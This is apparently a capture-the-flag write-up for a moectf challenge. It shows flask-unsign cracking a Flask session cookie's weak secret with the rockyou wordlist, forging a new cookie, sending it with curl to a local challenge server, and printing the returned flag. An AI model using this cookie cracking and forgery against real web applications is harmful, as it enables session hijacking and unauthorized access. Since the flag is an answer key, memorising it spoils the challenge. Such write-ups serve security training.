
```sh
flask-unsign --unsign --no-literal-eval --cookie 'eyJmcm9ncyI6WzAsMSwyLDMsNF19.asXaHA.KE6UF2j4lT3OkIxBkhagSHTR1Xs' --wordlist rockyou.txt
```
```log
[*] Session decodes to: {'frogs': [0, 1, 2, 3, 4]}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 236416 attemptsideo
b'qwe123456'
```
```sh
flask-unsign --sign --secret 'qwe123456' --cookie '{"frogs":[0,1,2,3,4,5,6,7,8]}'
```
```log
eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsNyw4XX0.asXhgg.M6L4yDBlhph0w2UcX2XlWYdqfmE
```
```sh
curl -s http://127.0.0.1:12345/api/claim -H "Cookie: frog_session=eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsNyw4XX0.asXhgg.M6L4yDBlhph0w2UcX2XlWYdqfmE" -D -
```
```log
HTTP/1.1 200 OK
Server: gunicorn
Date: Wed, 07 Oct 2026 06:08:47 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 61
Vary: Cookie

{"flag":"moectf{F1@sk_c00k1es_w1+h_w3ak_k3y_1s_vu1n3r@bl3}"}
```

# Flag
moectf{F1@sk_c00k1es_w1+h_w3ak_k3y_1s_vu1n3r@bl3}